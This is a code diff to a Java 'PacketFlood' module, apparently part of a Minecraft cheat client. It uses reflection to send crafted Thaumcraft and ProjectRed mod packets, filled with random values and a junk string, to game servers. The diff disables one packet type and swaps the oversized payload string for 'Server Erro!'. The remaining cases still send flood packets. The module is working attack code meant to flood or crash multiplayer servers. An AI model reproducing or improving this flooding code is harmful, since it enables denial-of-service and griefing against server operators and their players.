@@ -121,7 +121,7 @@ public class PacketFlood extends Module {
         PROJECTRED_TileFilteredImporter("mrtjp.projectred.expansion.TileFilteredImporter"),
         PROJECTRED_TileProjectBench("mrtjp.projectred.expansion.TileProjectBench"),
         THAUMCRAFT_Note("thaumcraft.common.lib.network.misc.PacketNote"),
-        THAUMCRAFT_FocusChange("thaumcraft.common.lib.network.misc.PacketFocusChangeToServer"),
+//        THAUMCRAFT_FocusChange("thaumcraft.common.lib.network.misc.PacketFocusChangeToServer"),
         THAUMCRAFT_ItemKey("thaumcraft.common.lib.network.misc.PacketItemKeyToServer");
 
         private final String clazz;
@@ -137,7 +137,7 @@ public class PacketFlood extends Module {
     }
 
     public void sendRandomPacket() {
-        String NMSL = "NMSL-wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
+        String NMSL = "Server Erro!";
         if (validPackets.isEmpty()) {
             return;
         }
@@ -304,9 +304,9 @@ public class PacketFlood extends Module {
                     case THAUMCRAFT_Note:
                         SimpleNetworkWrapper.class.getDeclaredMethod("sendToServer", IMessage.class).invoke(Class.forName("thaumcraft.common.lib.network.PacketHandler").getDeclaredField("INSTANCE").get(null), packetClass.getDeclaredConstructor(int.class, int.class, int.class, int.class).newInstance(rand.x(), rand.y(), rand.z(), 0));
                         break;
-                    case THAUMCRAFT_FocusChange:
-                        SimpleNetworkWrapper.class.getDeclaredMethod("sendToServer", IMessage.class).invoke(Class.forName("thaumcraft.common.lib.network.PacketHandler").getDeclaredField("INSTANCE").get(null), packetClass.getDeclaredConstructor(EntityPlayer.class, String.class).newInstance(mc.thePlayer, NMSL));
-                        break;
+//                    case THAUMCRAFT_FocusChange:
+//                        SimpleNetworkWrapper.class.getDeclaredMethod("sendToServer", IMessage.class).invoke(Class.forName("thaumcraft.common.lib.network.PacketHandler").getDeclaredField("INSTANCE").get(null), packetClass.getDeclaredConstructor(EntityPlayer.class, String.class).newInstance(mc.thePlayer, NMSL));
+//                        break;
                     case THAUMCRAFT_ItemKey:
                         SimpleNetworkWrapper.class.getDeclaredMethod("sendToServer", IMessage.class).invoke(Class.forName("thaumcraft.common.lib.network.PacketHandler").getDeclaredField("INSTANCE").get(null), packetClass.getDeclaredConstructor(EntityPlayer.class, int.class).newInstance(mc.thePlayer, Rand.num()));
                         break;
